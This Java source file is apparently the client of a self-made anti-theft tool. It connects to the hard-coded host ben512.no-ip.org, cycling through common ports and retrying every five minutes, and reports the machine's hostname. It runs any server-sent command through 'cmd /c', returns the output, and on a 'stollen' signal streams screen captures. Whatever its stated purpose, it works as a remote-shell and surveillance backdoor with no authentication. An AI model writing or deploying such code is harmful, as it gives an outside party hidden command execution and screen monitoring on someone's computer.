package com.ben.client;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;


import javax.imageio.ImageIO;

public class WorkerClass {
	
	private ObjectInputStream sInput;		// to read from the socket
	private ObjectOutputStream sOutput;		// to write on the socket
	public Socket socket;
public void Start() throws IOException, AWTException, InterruptedException
{
	boolean connected =false;
	int[] portnumbers = {5124,8080,80,443,3389,};
	while (!connected)
	{
		for (int i=0; i<portnumbers.length;i++)
		{
		connected =Connect(portnumbers[i]);
			if (connected==true)
			{
				break;
			}
		}
		Thread.sleep(300000);
	}
}	
	     
private boolean Connect(int port)
{
	try
	{
		
		socket = new Socket("ben512.no-ip.org", port);
		sInput  = new ObjectInputStream(socket.getInputStream());
		sOutput = new ObjectOutputStream(socket.getOutputStream());
			
		new ListenFromServer().start();
		System.out.println("Connected to Server using port "+port);
		//sOutput.writeObject(new Message(Message.LOGIN,System.getProperty("user.name")));
		sOutput.writeObject(new Message(Message.LOGIN,java.net.InetAddress.getLocalHost().getHostName()));
		
		return true;
	}
	catch (Exception e)
	{
		System.out.println(e.toString()+" using port "+port);
		return false;
	}
	
}
		
		

	
	
	
	

class ListenFromServer  extends Thread {

	public void run(){
		try {
			Message input;
			Runtime rt = Runtime.getRuntime();
		ScreenCapture s = new ScreenCapture(sOutput);
		while(true)
		{
			
				input =  (Message) sInput.readObject();
				System.out.println("Received Message");
				if (input.getType() ==Message.ACK)
				{
					//no problem. End program.
					sOutput.writeObject(new Message(Message.ACK,"Received Ack, Shutting down - not stollen"));
			//	System.exit(0);
				
				}
				if (input.getType() ==Message.LOGOUT)
				{
					System.out.println("Received LOGOUT, shutting down...");
					System.exit(0);
				}
								
				if (input.getType() ==Message.COMMAND)
				{
					System.out.println("Running command :" + input.getMessage());
					try{
					Process pr = rt.exec("cmd /c "+input.getMessage());
					
					InputStream stdin = pr.getInputStream();
					InputStreamReader isr = new InputStreamReader(stdin);
					BufferedReader br = new BufferedReader(isr);
					
					String line = null;
					String output="\n";
					while ( (line = br.readLine()) != null)
						{
						 System.out.println(line);
					    output +=line+"\n";
						}
					
					sOutput.writeObject(new Message(Message.MESSAGE,output));
					}
					
					catch (Exception e)
					{
						sOutput.writeObject(new Message(Message.MESSAGE,e.toString()));
					}
					//no problem. End program.
				
				}
				
				if (input.getType() ==Message.STOLLEN)
				{
					sOutput.writeObject(new Message(Message.ACK,"Received Ack, computer stollen. Sending screencaptures...."));
					//Stollen, start taking photos.
					if (!s.isAlive())
					{
					s.start();
					}
				}
			
		}
	
			
			
		
		}
		catch(Exception e)
		{
			System.out.println(e.toString());
		}
		
	}
}
}
